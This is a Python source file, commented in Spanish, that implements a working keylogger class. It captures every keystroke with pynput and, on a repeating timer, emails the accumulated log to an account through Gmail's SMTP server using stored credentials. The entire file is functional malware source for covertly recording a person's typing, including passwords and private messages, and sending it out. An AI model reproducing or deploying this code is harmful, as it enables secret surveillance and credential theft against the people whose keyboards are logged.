import smtplib

import pynput.keyboard

import threading

 

#Aqui vamos a guardar todo lo que se escriba

log = ""

#Para poder acceder al codigo como libreria lo vamos a declarar como class

 

class Keylogger:

    #Esta funcion al ser init sera la que comience cuando corramos el Keylogger como clase.

    #Esto se llama modo constructor,ya que construimos metodos(XD)

    #El metodo self se pone siempre y cuando pasemos un argumento al llamar a la funcion no ira a las variables self. sino que ira a lo siguiente que hemos puesto,

    #en este caso sería a time_interval

    def __init__(self, time_interval, email, password):

        #Aqui creamos una variable global para guardar los datos que se vayan escribiendo

        self.log = ""

        #Aqui vamos a guardar cuando queremos que se active el keylogger cada x segundos

        self.interval = time_interval

        #Aqui abajo vamos a meter los valores de correo que vamos a usar para mandar los datos que recopile el keylogger

        self.email = email

        self.password = password




    #Aqui vamos a hacer que los caracteres especiales como espacios,etc no hagan dificil la lectura

    def concatenar_al_log(self, string):

        self.log = self.log + string

 

        #Aqui es para que procese cuando pulsamos una tecla en el teclado(obviamente)

    def pulsacion(self, key):

            #Esto es para poner bien los espacios

            try:

                current_key = str(key.char)

            except AttributeError:

                if key == key.space:

                    current_key = " "

                else:

                    current_key = " " + " " + str(key) + " "

            self.concatenar_al_log(current_key)

        #Este es el reporte de las teclas presionadas que va a ser enviado por correo y en timer sale cada cuanto tiempo se envia en segundos

    def report(self):

            self.enviar_correo(self.email, self.password, self.log)

            self.log = ""

            timer = threading.Timer(self.interval, self.report)

            timer.start()

            #Esta es la funcion para que nos vaya enviando los correos

 

    def enviar_correo(self, email, password, message):

        #Aqui utilizamos la funcion SMTP para elegir el servidor de correo que queremos usar (gmail,hotmal,yahoo,etc...)

        #El numero son las credenciales para poder acceder al correo

        server = smtplib.SMTP("smtp.gmail.com", 587)

        #Aqui arrancamos el servidor,en login ponemos las credenciales,en sendmail es de quien,a quien y que mensaje

        #y para acabar cerramos el server

        server.starttls()

        server.login(email, password)

        server.sendmail(email, email, message)

        server.quit()




    def start(self):      

        keyboard_listener = pynput.keyboard.Listener(on_press=self.pulsacion)

        #Esto es para ir uniendo las letras asi hacemos palabras

        with keyboard_listener:

                self.report()

                keyboard_listener.join()

